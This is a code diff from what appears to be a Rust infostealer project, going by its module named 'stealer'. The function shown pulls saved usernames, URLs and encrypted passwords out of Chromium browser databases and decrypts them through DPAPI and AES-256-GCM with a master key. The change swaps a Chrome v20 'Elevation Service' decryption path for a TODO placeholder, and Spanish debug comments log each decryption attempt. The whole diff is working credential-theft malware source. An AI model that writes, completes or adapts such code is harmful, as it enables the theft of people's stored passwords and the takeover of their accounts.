@@ -241,24 +241,26 @@ fn extract_credentials_from_db(
             if username.is_empty() || encrypted_pwd.is_empty() {
                 continue;
             }
-            
-            // 🔍 DEBUG: Ver el formato del password encriptado
+
+            // DEBUG: Ver el formato del password encriptado
             writeln!(debug, "    🔍 Password para {}: {} bytes", username, encrypted_pwd.len()).ok();
-            if encrypted_pwd.len() >= 3 {
-                let prefix = &encrypted_pwd[0..3];
-                writeln!(debug, "       Prefix: {:02X} {:02X} {:02X} ({})", 
-                    prefix[0], prefix[1], prefix[2], 
-                    String::from_utf8_lossy(prefix)).ok();
+            let is_v20 = encrypted_pwd.len() >= 3 && &encrypted_pwd[0..3] == b"v20";
+            if is_v20 {
+                writeln!(debug, "       ⚠️ WARNING: Password v20 detectado. No se puede desencriptar. TODO: Implementar Elevation Service.").ok();
+                credentials.push(Credential {
+                    browser: browser_name.to_string(),
+                    url,
+                    username,
+                    password: "[v20 encrypted - TODO]".to_string(),
+                });
+                continue;
             }
-            
+
             // Intentar desencriptar el password
-            // IMPORTANTE: Primero DPAPI (passwords viejos), luego AES-GCM (passwords nuevos), luego elevation service (v20)
             let password = if let Ok(pwd) = decrypt_dpapi_fallback(&encrypted_pwd) {
-                // DPAPI v1 (Chrome antiguo, pre-v80)
                 writeln!(debug, "       ✅ DPAPI OK").ok();
                 pwd
             } else if let Some(key) = master_key {
-                // AES-256-GCM (Chromium moderno v80+: v10/v11)
                 writeln!(debug, "       ⚠️ DPAPI falló, intentando AES-GCM...").ok();
                 let result = decrypt_aes_gcm(&encrypted_pwd, key);
                 if result.is_ok() {
@@ -266,21 +268,13 @@ fn extract_credentials_from_db(
                     result.unwrap()
                 } else {
                     writeln!(debug, "       ❌ AES-GCM FALLÓ").ok();
-                    writeln!(debug, "       🔸 Intentando Elevation Service (v20)...").ok();
-                    if let Some(v20_password) = crate::stealer::elevation_service::try_decrypt_with_elevation_service(&encrypted_pwd) {
-                        writeln!(debug, "       ✅ ELEVATION SERVICE OK (v20 decrypted)").ok();
-                        v20_password
-                    } else {
-                        writeln!(debug, "       ❌ Elevation Service falló").ok();
-                        "[decrypt failed]".to_string()
-                    }
+                    "[decrypt failed]".to_string()
                 }
             } else {
-                // Sin master key y DPAPI falló
                 writeln!(debug, "       ❌ No master key disponible").ok();
                 "[no key]".to_string()
             };
-            
+
             credentials.push(Credential {
                 browser: browser_name.to_string(),
                 url,
